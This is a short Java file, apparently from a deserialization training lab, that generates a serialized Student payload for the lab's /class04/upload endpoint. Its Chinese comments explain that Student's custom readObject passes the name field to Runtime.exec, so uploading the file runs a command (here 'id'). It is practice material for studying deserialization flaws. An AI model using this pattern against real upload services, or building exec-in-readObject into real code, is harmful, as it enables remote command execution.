package class04;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

/**
 * ⽣成 class04 的 payload — ⾃定义 readObject → 命令执⾏
 * ⽬标: 上传 Student 对象，反序列化时⾃动触发 readObject() 执⾏命令
 * 靶场: /class04/upload
 */
public class GenPayload {
    public static void main(String[] args) throws Exception {
        // 自定义 readObject 会执行 Runtime.getRuntime().exec(name)
        // name 字段值就是要执行的命令
        Student student = new Student("id", 18);

        ObjectOutputStream oos = new ObjectOutputStream(
            new FileOutputStream("class04.ser"));
        oos.writeObject(student);
        oos.close();

        System.out.println("✅ 已⽣成: class04.ser");
    }
}
